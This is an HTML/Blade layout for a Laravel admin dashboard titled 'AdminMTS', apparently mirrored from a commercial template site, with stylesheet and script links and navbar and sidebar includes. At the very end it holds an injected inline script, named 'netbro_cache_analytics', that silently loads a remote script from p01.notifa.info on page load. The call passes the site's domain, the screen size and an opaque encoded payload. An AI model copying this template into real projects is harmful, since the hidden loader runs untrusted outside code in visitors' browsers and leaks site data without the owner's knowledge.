<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from www.radixtouch.in/templates/admin/lorax/source/light/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Dec 2018 07:04:45 GMT -->
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>AdminMTS | Dashboard</title>
    <!-- Favicon-->
    <link rel="icon" href="{{asset('assets/admin/assets/images/logo2.png')}}" type="image/x-icon">
    <!-- Plugins Core Css -->
    <link href="{{asset('assets/admin/assets/css/app.min.css')}}" rel="stylesheet">
    <!-- Custom Css -->
    <link href="{{asset('assets/admin/assets/css/style.css')}}" rel="stylesheet" />
    <!-- Theme style. You can choose a theme from css/themes instead of get all themes -->
    <link href="{{asset('assets/admin/assets/css/styles/all-themes.css')}}" rel="stylesheet" />
</head>
<body class="light">
    <!-- Page Loader -->
    <div class="page-loader-wrapper">
        <div class="loader">
            <div class="m-t-30">
                <img class="loading-img-spin" src="{{asset('assets/admin/assets/images/loading.png')}}" width="20" height="20" alt="admin">
            </div>
            <p>Please wait...</p>
        </div>
    </div>
    <!-- #END# Page Loader -->
    <!-- Overlay For Sidebars -->
    <div class="overlay"></div>
    <!-- #END# Overlay For Sidebars -->
    @include('sweet::alert')
    <!-- Top Bar -->
   @include('partials.navbar')
    <!-- #Top Bar -->
    <div>
       @include('partials.sidebar')
    </div>
    <section class="content">
        <div class="container-fluid">
           @yield('content')
        </div>
    </section>
    <!-- alert -->
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <!-- Plugins Js -->
    <script src="{{asset('assets/admin/assets/js/app.min.js')}}"></script>
    <script src="{{asset('assets/admin/assets/js/chart.min.js')}}"></script>
    <!-- Custom Js -->
    <script src="{{asset('assets/admin/assets/js/admin.js')}}"></script>
    <script src="{{asset('assets/admin/assets/js/pages/index.js')}}"></script>
    <script src="{{asset('assets/admin/assets/js/pages/charts/jquery-knob.js')}}"></script>
    <script src="{{asset('assets/admin/assets/js/pages/sparkline/sparkline-data.js')}}"></script>
    <script src="{{asset('assets/admin/assets/js/pages/medias/carousel.js')}}"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdAxyhvx539eqpSycx5hBFa86dwYjSflpJDEnIeXMbpxGRjaq%2bUzjXEQGjg%2fxDsgZ7nIomRKfJC1cAZNwe2qNZX0AL9vgflPfWEVMRMKAdPuQGbysOVrfFLDa2ebfc4Y4HonIbu5mFeZFh8bKm9W1JJGEMH5%2bHezt8YnIDo9ArvU8oKaLWw1sIbMCz5WLXCLW4AyFxXFQyB%2bgPM16riuQZdFFsK9PZD2bnKOfRn6isn%2bdMbkQcYX5yiSR3o8EUdpBIXpyfT3OLA%2fD3s6PM1KXnq%2fwDYsXFEvmBJ%2fhn6VPjGMO4BcWK6nJr6uvPJJBZgJnJnml7MWs75wSsDInBMrT2EWMkbihRSAsW5gXA9N3l9eLdGPq4VbI1O9W%2biPkaOMl8rPjjZ2wzgtRwtyOnqwPIRarbtxeE9XQA3BO1Cwk3oX4eRjJtTQFAOb3Ucm%2bSx%2fEHbe6OcW%2ftC9f0qBWhcp65N2c9cDqp8RMlmRSAZQTc7cTe%2fDzaWobBhtAusevirN%2fLPeTXn80WHj4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>